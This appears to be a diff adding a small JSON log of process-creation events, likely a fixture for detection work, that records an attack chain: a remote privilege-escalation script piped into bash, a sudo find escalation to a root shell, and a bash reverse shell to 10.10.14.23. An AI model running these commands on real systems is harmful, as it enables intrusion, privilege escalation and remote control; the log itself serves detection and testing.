@@ -1,0 +1,33 @@
+[
+  {
+    "Timestamp": "2026-10-17T14:10:00Z",
+    "EventID": 1,
+    "User": "root",
+    "Image": "/usr/sbin/cron",
+    "CommandLine": "/usr/sbin/cron -f"
+  },
+  {
+    "Timestamp": "2026-10-17T14:12:50Z",
+    "EventID": 1,
+    "User": "svc_backup",
+    "ParentImage": "/bin/bash",
+    "Image": "/usr/bin/curl",
+    "CommandLine": "curl -s http://10.10.14.23:8000/linpeas.sh | bash"
+  },
+  {
+    "Timestamp": "2026-10-17T14:13:45Z",
+    "EventID": 1,
+    "User": "root",
+    "ParentImage": "/usr/bin/sudo",
+    "Image": "/usr/bin/find",
+    "CommandLine": "/usr/bin/find . -exec /bin/sh -p ; -quit"
+  },
+  {
+    "Timestamp": "2026-10-17T14:14:20Z",
+    "EventID": 1,
+    "User": "root",
+    "ParentImage": "/bin/sh",
+    "Image": "/bin/bash",
+    "CommandLine": "bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1'"
+  }
+]
